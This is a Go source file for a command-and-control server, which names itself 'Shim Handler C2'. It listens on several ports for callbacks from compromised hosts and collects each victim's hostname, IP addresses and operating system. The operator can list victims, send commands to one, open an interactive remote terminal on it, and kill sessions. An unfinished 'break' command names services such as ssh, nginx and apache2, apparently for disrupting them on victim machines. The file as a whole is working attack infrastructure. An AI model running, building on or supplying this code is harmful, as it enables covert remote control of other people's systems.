package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// var port string
var hasPort bool = false
var killFlag bool = false
var takenPorts []string
var wg sync.WaitGroup
var globalMap globalMaster
var stdin chan string
var HOST_IP string
var colors Colors

func main() {
	colors = initColors()
	handleArgs()
	go readStdin()
	go handleQuit()
	// return
	// TODO: add handler for multiple ports
	infoln("Server starting...")
	caret()
	for {
		connectionHelper()
	}
}

func handleArgs() {
	HOST_IP = GetOutboundIP()
	globalMap = *CreateMaster()
	// args := os.Args
	// if len(args) > 1 {
	// 	for i := 1; i < len(args); i++ {
	// 		switch args[i] {
	// 		case "-p":
	// 			port = args[i+1]
	// 			hasPort = true
	// 		}
	// 	}
	// }
	// if !hasPort {
	// 	fmt.Printf("Port: ")
	// 	fmt.Scanln(&port)
	// 	hasPort = true
	// }
}

func connectionHelper() {
	wg.Add(4)
	go GetConnection("8003")
	go GetConnection("8004")
	go GetConnection("8005")
	go GetConnection("8006")
	wg.Wait()

}

func GetConnection(port string) {
	defer wg.Done()
	for {
		getPort, _ := net.Listen("tcp", HOST_IP+":"+port)

		conn, _ := getPort.Accept()
		var clientInfo ClientInfo
		remoteInfo, err := bufio.NewReader(conn).ReadString('\n')
		if strings.Contains(remoteInfo, "INFO:") {
			clientInfo = parseParams(remoteInfo)
		} else {
			clientInfo = ClientInfo{
				lanIP:      "Unknown",
				clientType: "Unknown",
				os:         "Unknown",
				osFlavor:   "Unknown",
				hostname:   "Unknown",
				isEncoded:  false,
			}
		}
		if err != nil {
			fmt.Println(err.Error())
		}
		remotePort := getRandomPort()
		takenPorts = append(takenPorts, remotePort)

		go handleClient(clientInfo, remotePort)
		time.Sleep(100 * time.Millisecond)
		conn.Write([]byte(remotePort))
		conn.Close()
		getPort.Close()
	}
}

func enterTerminal(channel *chan string, reader *bufio.Reader) {
	fmt.Printf("Entered terminal for client %d. Type 'leave' to leave.\n", globalMap.GetActiveChannel())
	activeClient := globalMap.GetActiveChannel()
	if globalMap.GetClient(activeClient).isEncoded {
		caret()
	}
	for {
		cmd, _ := reader.ReadString('\n')
		if trim(cmd) == "leave" {
			fmt.Println("---Leaving terminal---")
			globalMap.Leave()
			caret()
			return
		} else if globalMap.IsDead(activeClient) {
			errorln("Error: client session no longer exists. Exiting...")
			fmt.Println("---Leaving terminal---")
			globalMap.Leave()
			caret()
			return
		}
		*channel <- cmd
	}

}

func readStdin() {
	channel := globalMap.GetStdin()
	for {
		reader := bufio.NewReader(os.Stdin)
		rawCmd, _ := reader.ReadString('\n')
		cmd := trim(rawCmd)
		args := strings.Split(cmd, " ")
		switch args[0] {
		case "exit":
			infoln("Goodbye!")
			os.Exit(0)
		case "send":
			if IsActiveClient() {
				activeClient := globalMap.GetActiveChannel()
				client := globalMap.GetClient(activeClient)
				if client.isEncoded {
					globalMap.SetSingle(true)
					*channel <- cmd[5:]
				} else {
					errorln("Error: Can only use send with encoded clients")
					caret()
				}
			} else {
				errorln("Error: no active client")
				caret()
			}
		case "enter":
			if IsActiveClient() {
				globalMap.SetSingle(false)
				fmt.Println("---Entering terminal---")
				globalMap.Enter()
				enterTerminal(channel, reader)
			} else {
				errorln("Error: no active client")
				caret()
				break
			}
		case "set":
			switch args[1] {
			case "active":
				if len(args) < 3 {
					errorln("Error: must supply an ID")
					break
				}
				id, err := strconv.Atoi(args[2])
				if err != nil {
					errorln("Error: Please provide a valid client ID")
					break
				}
				if globalMap.GetActiveChannel() == id {
					fmt.Printf("Channel is already active!\n")
					break
				} else if globalMap.GetCurrentId() <= id || id < 0 {
					fmt.Printf("Error: client does not exist\n")
					break
				} else if globalMap.IsDead(id) {
					fmt.Printf("Error: client is dead\n")
					break
				}
				if IsActiveClient() {
					*channel <- "!!!FIN!!!"
				}
				globalMap.SetActive(id)
				fmt.Printf("Set client %d as active\n", id)
			default:
				displayHelp("set")
			}
			caret()
		case "get":
			switch args[1] {
			case "client":
				var clientId int
				if len(args) < 3 {
					clientId = globalMap.GetActiveChannel()
				} else {
					var err error
					clientId, err = strconv.Atoi(args[2])
					if err != nil {
						errorln("Error: Please provide a valid client ID")
						break
					}
				}
				// fmt.Println(globalMap.GetCurrentId())
				// fmt.Println(clientId)
				if globalMap.GetCurrentId() <= clientId || clientId < 0 {
					if len(args) < 3 {
						errorln("Error: no active client")
					} else {
						errorln("Error: client does not exist")
					}
				} else {
					clientDead := ""
					if globalMap.IsDead(clientId) {
						clientDead = " (DEAD CLIENT)"
					}
					fmt.Printf("Info for client %d%s:\n", clientId, clientDead)
					curClient := globalMap.GetClient(clientId)
					fmt.Printf(
						"Hostname: %s\n"+
							"LAN IP: %s\n"+
							"WAN IP: %s\n"+
							"Port: %s\n"+
							"Using client: %s\n"+
							"OS: %s\n"+
							"OS Type: %s\n"+
							"Encoded connection: %t\n",
						curClient.hostname,
						curClient.lanIP,
						curClient.wanIP,
						curClient.port,
						curClient.clientType,
						curClient.os,
						curClient.osFlavor,
						curClient.isEncoded,
					)
				}
			case "clients":
				fmt.Println("Current clients: ")
				for _, client := range globalMap.GetClients() {
					if !client.isDead {
						fmt.Printf("Client %d | %s (%s)\n", client.id, client.lanIP, client.hostname)
					}
				}
			case "active":
				switch args[2] {
				case "client":
					fmt.Printf("Current active client: %d\n", globalMap.GetActiveChannel())
				}
			default:
				displayHelp("get")
			}
			caret()
		case "kill":
			if len(args) >= 2 {
				clientId, err := strconv.Atoi(args[1])
				if err != nil {
					errorln("Error: Please provide a valid client ID")
					caret()
					break
				}
				if globalMap.GetCurrentId() <= clientId || clientId < 0 {
					if len(args) < 3 {
						errorln("Error: not an active client")
					} else {
						errorln("Error: client does not exist")
					}
				} else {
					client := globalMap.GetClient(clientId)
					killFlag = true
					fmt.Printf("Disconnecting client %d\n", clientId)
					clientDisconnect(client)
					killFlag = false
					// caret()
					break
				}
			} else {
				displayHelp("kill")
			}
			caret()
		case "break":
			if len(cmd) > 6 {
				if !IsActiveClient() {
					errorln("Error: No active client")
				}
				breakList := strings.Split(cmd[6:], " ")
				validBreaks := []string{
					"icmp",
					"ssh",
					"http",
					"nginx",
					"apache2",
				}
				var breakSend []string
				for i, brk := range breakList {
					if contains(validBreaks, brk) {
						breakSend = append(breakSend, brk)
					} else {
						errorf("Error at index %d: Unknown break", i)
					}
				}
			} else {
				errorln("Please input a break")
			}
			caret()
		case "help":
			if len(cmd) > 5 {
				displayHelp(cmd[5:])
			} else {
				displayHelp(cmd)
			}
			caret()
		case "":
			if rawCmd != "" {
				caret()
			}
		// case "\C":

		default:
			errorln("Error: unknown command")
			caret()
		}

		// if cmd[0] == '>' {
		// 	isKill, id := handleCommand(cmd[1:])
		// 	if isKill {

		// 	}
		// } else {
		//
		// }
	}
}

func handleCommand(cmd string) (bool, int) {
	return false, 0
}

func do(client Client) {
	channel := globalMap.GetChannel(client.id)
	isActive := <-*channel
	for {
		if isActive && globalMap.GetActiveChannel() == client.id {
			stdin := globalMap.GetStdin()
			stdReadLine := <-*stdin
			if stdReadLine == "!!!FIN!!!" {
				isActive = false
			} else {
				fmt.Printf("Received on client %d: %s\n", client.id, stdReadLine)
			}
		} else {
			isActive = <-*channel
		}
	}

}

func IsActiveClient() bool {
	return globalMap.GetActiveChannel() != -1
}

func getRandomPort() string {
	port1 := strconv.Itoa(random(10))
	port2 := strconv.Itoa(random(99))
	if len(port2) <= 1 {
		port2 = "0" + port2
	}
	// fmt.Println(port1)
	// fmt.Println(port2)
	remotePort := "2" + "5" + port1 + port2
	if findIndex(takenPorts, remotePort) == -1 {
		return remotePort
	}
	return getRandomPort()
}

func displayHelp(cmd string) {
	switch cmd {
	case "get":
		fmt.Printf(
			"Usage: get client [client id]\n" +
				"If client id is not specified, returns current client\n",
		)
	case "set":
		fmt.Printf(
			"Usage: set active [client id]\n",
		)
	case "kill":
		fmt.Println(
			"Usage: kill [client id]",
		)
	default:
		fmt.Printf(
			"-----Shim Handler C2: Made by Michael Burke-----\n" +
				"Commands: \n" +
				"set  [options]		Set attributes. run \"set help\" for more info.\n" +
				"get  [options]		Get attributes. run \"get help\" for more info.\n" +
				"kill [id]		Kill a session\n" +
				"send [command]		Send a command to the active client\n" +
				"enter			Enter a terminal session with the active client\n" +
				"leave			Leave the active terminal session\n" +
				"exit			Exit the application\n" +
				"help			Display the help menu\n",
		)
		// TODO add help for kill
		// TODO add name function
	}
}
